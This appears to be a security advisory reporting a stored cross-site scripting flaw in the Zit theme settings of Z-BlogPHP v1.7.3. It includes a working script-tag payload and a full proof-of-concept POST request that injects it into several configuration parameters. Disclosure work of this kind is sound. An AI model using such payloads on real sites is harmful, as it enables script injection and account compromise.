# Summary
A cross-site scripting (XSS) vulnerability in the Backend `Theme Management module` of Z-BlogPHP v1.7.3 allows attackers to execute arbitrary web scripts or HTML via a crafted payload.

There is a stored XSS vulnerability in the **Zit** theme configuration of zblogphp v1.7.3.

# Details
Select and enable this theme:
![image](https://github.com/user-attachments/assets/beb61e13-fb8f-484b-a0f1-8045df1d33d5)

Audit the configuration code of this theme
`zb_users\theme\Zit\main.php`

![image](https://github.com/user-attachments/assets/450b3569-07b8-4c85-8307-51f0450d7b0f)

The HTML tag elements in main.php are not filtered and have XSS vulnerabilities.

So we construct the corresponding payload according to the HTML format:
```html
";><ScRiPt>alert(7)</ScRiPt>
```

Next, we use burpsuite to intercept the HTTP request package saved by the normal configuration options, and then modify the value of the parameter to the payload we constructed:
![image](https://github.com/user-attachments/assets/fc8a8b44-e476-4b96-a1eb-4718f810e24f)
![image](https://github.com/user-attachments/assets/a098fd16-fff7-42b1-86b7-d9f15f5f9eda)

Then we visit the configuration interface `main.php` again, and we can find that the stored XSS is triggered:
![image](https://github.com/user-attachments/assets/f34be924-5acf-46a5-8df6-6fd3c5191ea9)

At this point, the payload we constructed is spliced ​​on the website as follows:
![image](https://github.com/user-attachments/assets/e3c1d84e-9cbe-420a-b4ee-26bbe66bb08b)


# PoC
```html
";><ScRiPt>alert(7)</ScRiPt>
```

```
POST /zb_users/theme/zit/main.php HTTP/1.1
xxx

csrfToken=716554d3c6a82692767bb6598496e49c&Logo=";><ScRiPt>alert(7)</ScRiPt>&Backdrop=&Cover=http%3A%2F%2Fzblog%3A81%2Fzb_users%2Ftheme%2FZit%2Fstyle%2Fbg.jpg&Hue=";><ScRiPt>alert(7)</ScRiPt>&MenuAnimate=1&DefaultAdmin=0&StaticName=1&ListTags=0&ListAlbum=0&HideIntro=0&MobileSide=";><ScRiPt>alert(7)</ScRiPt>&SideMods=&Motto=Nice+to+meet+you%2C+too%21&MottoUrl=&MottoSize=&CmtIds=&GbookID=2&RandLog=0&HideRand=0&Description=&Keywords=&RelatedTitle=%E5%B0%91%E9%95%BF%E5%92%B8%E9%9B%86&CommentTitle=%E7%BE%A4%E8%B4%A4%E6%AF%95%E8%87%B3
```
![image](https://github.com/user-attachments/assets/f34be924-5acf-46a5-8df6-6fd3c5191ea9)
![image](https://github.com/user-attachments/assets/e3c1d84e-9cbe-420a-b4ee-26bbe66bb08b)
